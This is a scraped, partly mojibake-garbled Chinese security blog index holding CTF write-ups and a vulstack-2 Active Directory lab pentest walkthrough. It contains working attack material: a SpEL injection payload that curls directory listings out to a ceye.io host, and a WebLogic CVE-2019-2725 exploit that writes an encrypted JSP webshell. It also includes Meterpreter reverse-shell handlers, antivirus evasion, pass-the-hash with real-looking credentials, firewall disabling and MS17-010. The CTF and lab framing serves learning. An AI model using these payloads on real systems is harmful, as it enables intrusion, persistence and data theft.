è¿™ä¸ªåˆ©â½¤éœ€è¦ä½¿â½¤De1taâ½¤æˆ·å’ŒSystemæƒé™ï¼ŒDe1taæœ‰DMæœºå™¨çš„Genric Writeæƒé™ï¼Œåˆ©â½¤èµ„æºå§”æ´¾æœ¬åœ°ææƒã€‚ ç„¶ååœ¨System beaconä¸‹æ‰§â¾ï¼ˆmake tokenåï¼‰ï¼š mimikatz !lsadump::dcshadow /object:De1ta /attribute:primaryGroupID /value:514 mimikatz @lsadump::dcshadow /push å³å¯ä¿®æ”¹De1taâ½¤æˆ·çš„primaryGroupIDå±æ€§ï¼Œå°†å…¶å˜ä¸ºåŸŸç®¡ç†å‘˜ï¼Œéšåç›´æ¥ä½¿â½¤è¿™ä¸ªè´¦æˆ·é€šè¿‡smbæ‰“ dcå³å¯ã€‚ ç¬¬ä¸€æ­¥ï¼Œæ‰¾äº†ç¯‡æ–‡ç« ï¼šæŠ€æœ¯è®¨è®º | ä¸€æ¬¡è¯¦ç»†çš„Kerberoastæ”»å‡»æ¼”ç¤º æ”»å‡»è€…é€šå¸¸ä¼šé€‰æ‹©é‚£äº›å¯èƒ½è®¾ç½®äº†å¼±å¯†ï¼Œç ç ´è§£æˆåŠŸç‡è¾ƒé«˜çš„ç¥¨æ®æ¥å°è¯•ç ´è§£ã€‚ Calcæ ¹æ®urlçŒœæµ‹æ˜¯spelæ³¨å…¥ï¼Œ æç¤ºhacker,å‚è€ƒ https://xi4or0uji.github.io/2019/03/20/code-breaking-easy/#Javacon å½“æ—¶çš„payloadï¼Œåˆ©ç”¨åå°„ 1T(String).getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;ex&#39;+&#39;ec&#39;,T(String[])).invoke(T(String).getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;getRu&#39;+&#39;ntime&#39;).invoke(T(String).getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;)), new String[]&#123;&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-c&#39;,&#39;curl http:&#x2F;&#x2F;abcdef.ceye.io&#x2F;&#96;cd &#x2F; &amp;&amp; ls|base64|tr \\&quot;\\n\\&quot; \\&quot;-\\&quot;&#96;&#39;&#125;) fuzzå¾—åˆ°é»‘åå• 123456java.+lang,Runtime,exec.*\\(StringgetClassT(new# https://aluvion.github.io/2019/04/25/Java%E7%89%B9%E8%89%B2-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/ 12345#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15].invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7].invoke(null),&#39;curl 172.17.0.1:9898&#39;) è¿™é‡Œä½¿ç”¨ç¬¬ä¸‰ç§ï¼Œå¯ä»¥å°†ä¸€äº›å…³é”®å­—ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ç»•è¿‡ï¼Œä½†æ˜¯å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸï¼Œè€ƒè™‘æ–‡ä»¶è¯»å– 1&#39;&#39;.class.forName(&#39;java.nio.file.Files&#39;).getDeclaredMethods()[17].invoke(null,&#39;&#39;.class.forName(&#39;java.nio.file.Paths&#39;).getDeclaredMethods()[0].invoke(null,&#39;&#x2F;flag&#39;,&#39;&#39;.class.forName(&#39;jav&#39;+&#39;a.lang.&#39;+&#39;Str&#39;+&#39;ing&#39;).getDeclaredMethods()[63].invoke(&#39;&#39;,&#39;a&#39;))) è¿˜å¯ä»¥ä½¿ç”¨NEWï¼Œå¤§å†™ç»•è¿‡ 1NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File(&#39;&#x2F;flag&#39;)))).nextLine() Nu1Lçš„payloadï¼Œåˆ©ç”¨\\x00 1&#39;calc&#39;:&#39;T\\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass(&quot;java.nio.file.Files&quot;).readAllLines(T\\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass(&quot;java.nio.file.Paths&quot;).get(&quot;&#x2F;flag&quot;))&#39; ==========================æŠ„ä¸‹wp bypass the cloud WAF [https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/Animal%20Crossing](https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/Animal Crossing) äº‘waf 123456789101112var blackList &#x3D; []string&#123; &#x2F;&#x2F;global &quot;document&quot;, &quot;window&quot;, &quot;top&quot;, &quot;parent&quot;, &quot;global&quot;, &quot;this&quot;, &#x2F;&#x2F;func &quot;console&quot;, &quot;alert&quot;, &quot;log&quot;, &quot;promise&quot;, &quot;fetch&quot;, &quot;eval&quot;, &quot;import&quot;, &#x2F;&#x2F;char &quot;&lt;&quot;, &quot;&gt;&quot;, &quot;&#96;&quot;, &quot;\\\\*&quot;, &quot;&amp;&quot;, &quot;#&quot;, &quot;%&quot;, &quot;\\\\\\\\&quot;, &#x2F;&#x2F;key &quot;if&quot;, &quot;set&quot;, &quot;get&quot;, &quot;with&quot;, &quot;yield&quot;, &quot;async&quot;, &quot;wait&quot;, &quot;func&quot;, &quot;for&quot;, &quot;error&quot;, &quot;string&quot;, &#x2F;&#x2F;string &quot;href&quot;, &quot;location&quot;, &quot;url&quot;, &quot;cookie&quot;, &quot;src&quot;,&#125; ç»•è¿‡é»‘åå•çš„æ–¹æ³•æ˜¯é¿å…ä½¿ç”¨ç¦ä»¤ä¸­çš„å­—ç¬¦ä¸²å’Œå­—ç¬¦ã€‚åœ¨è¿™é‡Œï¼Œç”±äºgoçš„irisæ¡†æ¶é—®é¢˜ï¼Œ;ä»¥åŠä¹‹åçš„æ•°æ®å°†è¢«åˆ é™¤ï¼Œå¹¶å¯ä»¥é€šè¿‡%0a ä¸»è¦æ˜¯å­¦ä¹ ç»•è¿‡wafçš„æ€è·¯ 1234567891. Pass in data to fmt.Sprintf(&quot;&#39;%s&#39;;&quot;, data), and then parse the syntax. If parse fails, the error will be returned directly.2. And then we visit AST nodes: 1. VariableExpression&#x2F;AssignExpression, All declaration&#x2F;assignment statements will ban 2. CallExpression, all function call, and callee not Identifier, will ban, example: 1. ban: test.test()ã€a[x]() 2. pass: test() 3. BracketExpression, all member reference and member is not Identifier, will ban, example: 1. ban: a[1]ã€a[&#39;xx&#39;] 2. pass: a[x] ç„¶åæ˜¯fuzzï¼Œæœ€ç»ˆpayload 1data&#x3D;base64DATAXXXXXXX&#39;%0atry&#123;throw &#39;ev&#39;%2b&#39;al&#39;&#125;catch(e)&#123;try&#123;throw frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a&#x2F;&#x2F;","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"vulstack-2","slug":"vulstack-2","date":"2020-05-02T11:22:22.000Z","updated":"2020-05-06T04:30:47.268Z","comments":true,"path":"2020/05/02/vulstack-2/","link":"","permalink":"https://glotozz.github.io/2020/05/02/vulstack-2/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€ç¯å¢ƒæ­å»º äºŒã€ä¿¡æ¯æ”¶é›† ä¸‰ã€getshell å››ã€å…æ€+ä¸Šçº¿ äº”ã€ä¿¡æ¯æ”¶é›† å…­ã€æ¨ªå‘æ¸—é€ ä¸ƒã€å†…ç½‘æ¼æ´ ä¸€ã€ç¯å¢ƒæ­å»ºDC IPï¼š10.10.10.10 OSï¼šWindows 2012(64) åº”ç”¨ï¼šADåŸŸ WEB IP1ï¼š10.10.10.80 IP2ï¼š192.168.48.129 OSï¼šWindows 2008(64) åº”ç”¨ï¼šWeblogic 10.3.6 MSSQL 2008 æ‰‹åŠ¨å¯åŠ¨ 1C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\bin\\startWebLogic PC IP1ï¼š10.10.10.201 IP2ï¼š192.168.48.130 OSï¼šWindows 7(32) äºŒã€ä¿¡æ¯æ”¶é›†1nmap -sS -sV -T4 -A -p- 192.168.48.129 è™½ç„¶pingä¸é€šï¼Œä½†æ˜¯nmapèƒ½æ— pingæ‰«æ ä¸‰ã€getshellå­˜åœ¨weblogicæœåŠ¡ï¼Œè®¿é—®http://192.168.48.129:7001/console ä½¿ç”¨weblogicscanæ‰«æï¼Œ pocï¼šhttps://github.com/TopScrew/CVE-2019-2725 1python weblogic-2019-2725.py 10.3.6 http:&#x2F;&#x2F;192.168.48.129:7001 ä¸Šä¼ äº†demo.phpï¼Œè·¯å¾„ä¸º./servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/demo.jspï¼Œä¿®æ”¹ä¸Šä¼ çš„æºç æˆ–è€…å‘½ä»¤æ‰§è¡Œå†™å…¥æ–‡ä»¶ echoçš„å†…å®¹ä¸­ä¸­å­˜åœ¨&gt;ç­‰ç‰¹æ®Šå­—ç¬¦éœ€è¦ä½¿ç”¨^è½¬ä¹‰ï¼Œä½¿ç”¨echo xx&gt;aaé»˜è®¤è¿™æ ·ä¼šåœ¨æ–‡ä»¶ç»“å°¾å¤šä¸ªæ¢è¡Œï¼Œä½¿ç”¨set/p=xxxx&lt;nul&gt;aa.txt 1python weblogic-2019-2725.py 10.3.6 http:&#x2F;&#x2F;192.168.48.129:7001 &quot;set&#x2F;p&#x3D;^&lt;%@page import&#x3D;\\&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*\\&quot;%^&gt;^&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%^&gt;^&lt;%if(request.getParameter(\\&quot;pass\\&quot;)!&#x3D;null)&#123;String k&#x3D;(\\&quot;\\&quot;+UUID.randomUUID()).replace(\\&quot;-\\&quot;,\\&quot;\\&quot;).substring(16);session.putValue(\\&quot;u\\&quot;,k);out.print(k);return;&#125;Cipher c&#x3D;Cipher.getInstance(\\&quot;AES\\&quot;);c.init(2,new SecretKeySpec((session.getValue(\\&quot;u\\&quot;)+\\&quot;\\&quot;).getBytes(),\\&quot;AES\\&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%^&gt;&lt;nul&gt;.&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;shell.jsp&quot; å››ã€å…æ€+ä¸Šçº¿å¼¹ä¸ªcsï¼Œå› ä¸ºå­˜åœ¨360ï¼Œéœ€è¦å¯¹exeè¿›è¡Œå…æ€å¤„ç† ä¸€å¼€å§‹ä½¿ç”¨AVIatoråˆ¶ä½œmsfçš„å…æ€ï¼Œä½†æ˜¯1minå°±è¢«æ€äº†ã€‚ã€‚ ç›´æ¥ä½¿ç”¨å†°èçš„msfè”åŠ¨ 1set payload java&#x2F;meterpreter&#x2F;reverse_tcp ä½†æ˜¯å¾—åˆ°çš„ä¸æ˜¯windows/meterpreter/ï¼Œ ä½¿ç”¨shellteråˆ¶ä½œmsfå…æ€ï¼Œä½¿ç”¨getuidç­‰èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œï¼ˆæ³¨æ„getsystemä¼šè¢«360æ‹¦æˆªï¼Œè¿™å’Œå…æ€æ— å…³ï¼Œç³»ç»Ÿè¡¥ä¸æœ‰å…³ï¼Œæ‰€ä»¥åœ¨æœ‰æ€è½¯çš„æƒ…å†µä¸‹å¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ï¼‰ã€‚ ä½¿ç”¨shellcodeåŠ è½½å™¨å…æ€csï¼ŒæˆåŠŸä¸Šçº¿å¹¶æ‰§è¡Œå‘½ä»¤ systemæƒé™ï¼Œå†å’Œmsfè”åŠ¨ 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 0.0.0.0set lport 1235exploit cså¼€ä¸ªsocks4aä»£ç† äº”ã€ä¿¡æ¯æ”¶é›†æœ¬æœºä¿¡æ¯æ”¶é›† 123456789101112net view è·å–åŒä¸€åŸŸçš„è®¡ç®—æœºåˆ—è¡¨ipconfig &#x2F;allnslookup test.labsysteminfotasklist è§‚å¯Ÿæ˜¯å¦å­˜åœ¨æ€è½¯netuser åŸŸæ§æ‰å­˜åœ¨krbtgtnet localgroup administratorquery user || qwinsta 3389å¯èƒ½æ— æ³•ç™»é™†netstat -ano è§‚å¯Ÿpidæ˜¯å¦establish03ä¹‹å‰ï¼šnetsh firewall set opmode disable03ä¹‹åï¼šnetsh advfirewall set allprofiles state offæŸ¥çœ‹é˜²ç«å¢™é…ç½®ï¼šnetsh firewall show config åŸŸä¿¡æ¯æ”¶é›† 12345whoami &#x2F;all æŸ¥çœ‹sidnet user xxx &#x2F;domain è¦æ±‚åœ¨åŸŸé‡Œé¢net config workstationnet time &#x2F;domain å¿«é€Ÿå®šä½æ˜¯å¦å­˜åœ¨åŸŸnet group &quot;Domain Controllers&quot; &#x2F;domain æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº icmpåè®®æ¢æ´» 1for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&#x3D;&quot; 1nbtscan-1.0.35.exe 10.10.10.0&#x2F;24 1&quot;arp-scan(x64).exe&quot; -t 10.10.10.0&#x2F;24 åŸºæœ¬ç¡®å®šåŸŸä¸­3å°ä¸»æœº ç«¯å£æ‰«æ sæ‰«æå™¨ 1S.exe TCP 10.10.10.10 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,20,49,111,256 &#x2F;Banner &#x2F;save 1S.exe TCP 10.10.10.201 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,20,49,111,256 &#x2F;Banner &#x2F;save nmap 1proxychains nmap -sT -Pn -T4 10.10.10.10 msfï¼ˆæ·»åŠ è·¯ç”±æˆ–è€…ï¼‰ 1use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp å…­ã€æ¨ªå‘æ¸—é€csä½¿ç”¨mimikatz æ—¢ç„¶çŸ¥é“äº†åŸŸæ§å¯†ç ï¼ŒCSå†…ç½‘ä¸Šçº¿ ä½¿ç”¨wmiexec 12345678git clone https:&#x2F;&#x2F;github.com&#x2F;ropnop&#x2F;impacket_static_binariespython setup.py installcd examples#ç”±äºå¯†ç ä¸­æœ‰ä¸ª@,è¿™é‡Œé‡‡ç”¨hashesçš„æ–¹å¼proxychains python wmiexec.py -debug &#39;administrator:Gqy123@@1@10.10.10.10&#39;proxychains python wmiexec.py -debug -hashes 00000000000000000000000000000000:7146afd69485333d5c2028451fdd2a11 &#39;administrator@10.10.10.10&#39; ä¸Šä¼ beacon.exe ä½¿ç”¨ipcä¼ æ–‡ä»¶åˆ°åŸŸæ§ 123456net use \\\\10.10.10.10\\ipc$ 1qaz@WSX &#x2F;user:de1aydir \\\\10.10.10.10\\c$copy beacon.exe \\\\10.10.10.10\\c$dir \\\\10.10.10.10\\c$#å®šæ—¶ä»»åŠ¡å¯åŠ¨at \\\\10.10.10.10 10:00 c:\\\\beacon.exe ä½¿ç”¨smbclientä¼ æ–‡ä»¶ 12proxychains smbclient &#x2F;&#x2F;10.10.10.10&#x2F;c$ -U administratorput beacon.exe åˆ©ç”¨wmiæ‰§è¡Œ æˆåŠŸ ä¸ƒã€å†…ç½‘æ¼æ´å¦‚æœå‰é¢mimikatzæ²¡æœ‰æ‹¿åˆ°å¯†ç ï¼Œæ ¹æ®å¼€æ”¾çš„ç«¯å£è¿›è¡Œç›¸åº”çš„æµ‹è¯• 3389æ·»åŠ ç”¨æˆ·è¿œç¨‹ç™»å½• å…³é—­é˜²ç«å¢™ 1netsh adcfirewall set allprofiles state off 1meterpreter&gt; run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp ä¸‹é¢çš„æ“ä½œä¼šè¢«360æ‹¦æˆª 1234567#æ–°å»ºç”¨æˆ·net user gqy Abc1234 &#x2F;add#å°†ç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°ç»„net localgroup administrators gqy &#x2F;add#å¼€å¯3389REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;vfDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f 12meterpreter&gt;run post&#x2F;windows&#x2F;manage&#x2F;enable_rdpmeterpreter&gt;run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp username&#x3D;&quot;gqy&quot; password&#x3D;&quot;Abc1234&quot; å°è¯•å…³é—­360æ€è½¯ 12meterpreter&gt;run killavmeterpreter&gt;run post&#x2F;windows&#x2F;manage&#x2F;killav å¤±è´¥ï¼Œé‚ä½œç½¢ 445ç«¯å£å°è¯•ms17-010 1234567891011proxychains msfconsolesearch ms17-010use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010set RHOSTS 10.10.10.10 10.10.10.201set threads 50runuse auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_commandset RHOSTS 10.10.10.10set COMMAND whoamirun å¾—åˆ°äº†systemæƒé™","categories":[],"tags":[{"name":"åŸŸæ¸—é€","slug":"åŸŸæ¸—é€","permalink":"https://glotozz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]},{"title":"36DCTF-wp","slug":"36DCTF-wp","date":"2020-05-01T02:49:49.000Z","updated":"2020-05-06T13:21:12.624Z","comments":true,"path":"2020/05/01/36DCTF-wp/","link":"","permalink":"https://glotozz.github.io/2020/05/01/36DCTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• WEB_ç»™ä½ shell WEB_WUSTCTFæœ´å®æ— åRevenge WEB_ALL_INFO_U_WANT æ•´ä½“è´¨é‡è¿˜æ˜¯ä¸é”™ï¼Œä½†æ˜¯è‡ªå·±æ²¡åšå‡ é¢˜ã€‚ã€‚ WEB_ç»™ä½ shell12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php//It's no need to use scanner. Of course if you want, but u will find nothing.error_reporting(0);include \"config.php\";if (isset($_GET['view_source'])) &#123; show_source(__FILE__); die;&#125;function checkCookie($s) &#123; $arr = explode(':', $s); if ($arr[0] === '&#123;\"secret\"' &amp;&amp; preg_match('/^[\\\"0-9A-Z]*&#125;$/', $arr[1]) &amp;&amp; count($arr) === 2 ) &#123; return true; &#125; else &#123; if ( !theFirstTimeSetCookie() ) setcookie('secret', '', time()-1); return false; &#125;&#125;function haveFun($_f_g) &#123; $_g_r = 32; $_m_u = md5($_f_g); $_h_p = strtoupper($_m_u); for ($i = 0; $i &lt; $_g_r; $i++) &#123; $_i = substr($_h_p, $i, 1); $_i = ord($_i); print_r($_i &amp; 0xC0); &#125; die;&#125;isset($_COOKIE['secret']) ? $json = $_COOKIE['secret'] : setcookie('secret', '&#123;\"secret\":\"' . strtoupper(md5('y1ng')) . '\"&#125;', time()+7200 );checkCookie($json) ? $obj = @json_decode($json, true) : die('no');if ($obj &amp;&amp; isset($_GET['give_me_shell'])) &#123; ($obj['secret'] != $flag_md5 ) ? haveFun($flag) : echo \"here is your webshell: $shell_path\";&#125;die; cookieä¼ªé€ ï¼Œé™åˆ¶äº†ç”±&quot;0-9A-Zæ„æˆ ä»”ç»†è§‚å¯Ÿå‘ç°å­˜åœ¨ç»•è¿‡ï¼Œä¸ç„¶è¿™é¢˜å°±æ²¡æ³•åšäº†ã€‚ã€‚ C0 1100 0000 md5å€¼ç”±0-9a-fç»„æˆï¼Œå¹¶ä¸”è¿™é‡Œè½¬ä¸ºå¤§å†™ 48-57ï¼Œ65-70 48 0011 0000 65 0100 0001 æ ¹æ®&amp;çš„è¿ç®—è§„åˆ™ï¼ŒæŸä¸€ä½ä¸º0ï¼Œå¯ä»¥çŸ¥é“&amp;å‰ä¸ºæ•°å­— å¯¹é¢˜ç›®è¿”å›çš„md5è¿›è¡Œåˆ¤æ–­ 10006464640064064646464006406464064640064006400000000000 å› ä¸ºå‰3ä½ä¸ºæ•°å­—ï¼Œå¯ä»¥çˆ†ç ´ï¼ˆä¼ 001ä¼šjson_decodeå¤±è´¥ï¼‰ï¼Œå†åˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒ 12345678910111213141516171819202122232425262728293031 &lt;?phperror_reporting(0);session_start();//there are some secret waf that you will never know, fuzz me if you canrequire \"hidden_filter.php\";if (!$_SESSION['login']) die('&lt;script&gt;location.href=\\'./index.php\\'&lt;/script&gt;');if (!isset($_GET['code'])) &#123; show_source(__FILE__); exit();&#125; else &#123; $code = $_GET['code']; if (!preg_match($secret_waf, $code)) &#123; //æ¸…ç©ºsession ä»å¤´å†æ¥ eval(\"\\$_SESSION[\" . $code . \"]=false;\"); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker &#125; else die('hacker');&#125;/* * When you feel that you are lost, do not give up, fight and move on. * Being a hacker is not easy, it requires effort and sacrifice. * But remember â€¦ we are legion! * â€”â€”â€”â€”Deep CTF 2020*/ X-Powered-By: PHP/7.3.11 å°†phpçš„å†…ç½®å‡½æ•°fuzzä¸€éï¼Œè¿˜æ˜¯æœ‰ä¸å°‘å¯ç”¨çš„ï¼Œ å†æŠŠå•å­—ç¬¦fuzzä¸€é æ‹¬å·è¢«è¿‡æ»¤æˆ‘è£‚å¼€äº†å‘€ ===========================çœ‹äº†wp payload 1?code&#x3D;]&#x3D;1?&gt;&lt;?&#x3D;require~%d0%99%93%9e%98%d1%8b%87%8b?&gt; æ ¸å¿ƒæ˜¯ï¼šPHPé»‘é­”æ³• requireå’Œå–åè¿ç®—ç¬¦ä¹‹é—´ä¸éœ€è¦ç©ºæ ¼ç…§æ ·æ‰§è¡Œï¼Œä»¥åŠ?&gt;&lt;?ç»•è¿‡åˆ†å· ç±»ä¼¼çš„è¿˜æœ‰&lt;?=include$_GET[1];?&gt;å½“ç„¶è¿™é‡Œè¢«è¿‡æ»¤äº† æœç´¢flag 1find &#x2F;etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot; WEB_WUSTCTFæœ´å®æ— åRevenge12345678910111213141516171819//level 1if (isset($_GET['num']))&#123; $num = $_GET['num']; $numPositve = intval($num); $numReverse = intval(strrev($num)); if (preg_match('/[^0-9.-]/', $num)) &#123; die(\"éæ´²æ¬¢è¿ä½ 1\"); &#125; if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§ die(\"éæ´²æ¬¢è¿ä½ 2\"); &#125; if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123; echo \"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;\"; &#125;else&#123; die(\"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜\"); &#125;&#125;else&#123; die(\"å»éæ´²å§\");&#125; åˆ©ç”¨æµ®ç‚¹ç²¾åº¦ï¼šnum=1000000000000000.00000000000000010 ç¬¬äºŒå…³ï¼š$md5=md5(md5($md5)ï¼Œæš´åŠ›fuzzå‡ºmd5=0e4604768110902957 ç¬¬ä¸‰å…³ca&#39;&#39;t%09/flag WEB_ALL_INFO_U_WANTé¢˜ç›®ç¯å¢ƒä¸ºnginx/1.14.0 (Ubuntu) ä¸€å¼€å§‹ä¸€ç›´æ²¡å»è¯•æ—¥å¿—ï¼Œå› ä¸ºä»¥ä¸ºæ²¡æƒé™ï¼ˆä¹‹å‰æµ‹è¯•apache2çš„æ—¥å¿—æƒé™é»˜è®¤www-dataæ˜¯æ²¡æœ‰æƒé™è®¿é—®çš„ï¼‰ é»˜è®¤æƒé™ï¼šnginxä»¥_wwwç”¨æˆ·è¿è¡Œï¼Œæ—¥å¿—æ–‡ä»¶access.logç­‰çš„æƒé™çš†ä¸ºï¼š_www _www rw------- å› æ­¤å¯ä»¥åŒ…å« èšå‰‘è¿ä¸Š é¢–å¥‡å¸ˆå‚…çš„å¦ä¸€ç§é¢„æœŸè§£æ³•æ˜¯åªè¦è‡ªå·±åŒ…å«è‡ªå·± å°±ä¼šè¿›å…¥æ­»å¾ªç¯ æ­»å¾ªç¯åªèƒ½è¢«æ‰‹å·¥æ‰“æ–­æˆ–è€…è¢«nginxè¶…æ—¶ ä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿ç•™äº† 1?file&#x3D;all_info_u_want.php&amp;all_info_i_want ä¸€å¼€å§‹å°è¯•åŒ…å«ä¸´æ—¶æ–‡ä»¶èƒ½è¯»å–åˆ°tmp_nameä½†æ˜¯åŒ…å«ä¸åˆ°ï¼Œè¿™æ ·å°±èƒ½åŒ…å«åˆ°äº†ã€‚","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"DASCTF-babytricks-wp","slug":"DASCTF-babytricks-wp","date":"2020-04-25T08:10:35.000Z","updated":"2020-04-26T12:10:05.774Z","comments":true,"path":"2020/04/25/DASCTF-babytricks-wp/","link":"","permalink":"https://glotozz.github.io/2020/04/25/DASCTF-babytricks-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ä¸€ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²+ä¸‡èƒ½å¯†ç  äºŒã€ ä¸‰ã€bypass disable_function ä¸€ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²+ä¸‡èƒ½å¯†ç 1select * from user where user&#x3D;&#39;$user&#39; and passwd&#x3D;&#39;%s&#39; æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ„é€ %1$å¯ä»¥åƒæ‰useråé¢çš„å•å¼•å·ï¼Œpasswd=^0ï¼Œå­˜åœ¨è®¸å¤šé»‘åå•ï¼Œå‘ç°^æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œ^0æˆåŠŸç™»å½• äºŒã€12345678910111213141516171819&lt;?phperror_reporting(0);session_save_path('session');session_start();require_once './init.php';if($_SESSION['login']!=1)&#123; die(\"&lt;script&gt;window.location.href='./index.php'&lt;/script&gt;\");&#125;if($_GET['shell'])&#123; $shell= addslashes($_GET['shell']); $file = file_get_contents('./shell.php'); $file = preg_replace(\"/\\\\\\$shell = '.*';/s\", \"\\$shell = '&#123;$shell&#125;';\", $file); file_put_contents('./shell.php', $file);&#125;else&#123; echo \"set your shell\".\"&lt;br&gt;\"; chdir(\"/\"); highlight_file(dirname(__FILE__).\"/admin.php\");&#125;?&gt; [å°å¯†åœˆ]ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢å­¦ä¹  12?shell&#x3D;;phpinfo();?shell&#x3D;$0 ä¸‰ã€bypass disable_function1set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,error_log,dl,FFI::cdef,debug_backtrace,imap_mail,mb_send_mail è®¾ç½®äº†open_basedir è¿‡æ»¤äº†mail()ã€error_log()ã€ini_set() 1234567int preload()&#123; const char *command; int i; command &#x3D; getenv(&quot;EVIL_CMDLINE&quot;); return system(command);&#125; https://www.anquanke.com/post/id/197745?from=singlemessage fuzzèƒ½è§¦å‘ld_preloadçš„å‡½æ•°ï¼Œ 1234567891011mb_send_mailexecsystempassthrushell_execerror_logmailgnupg_initimap_mailpcntl_execnew gnupg() è¿™é‡Œå¯ä»¥ç”¨new gnupg()è§¦å‘ld_preload è¿˜æœ‰ä¸ªå°ç–‘é—®ï¼Œä¸ºå•¥è¦ç»™soæ–‡ä»¶","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"é€šè¾¾OA < 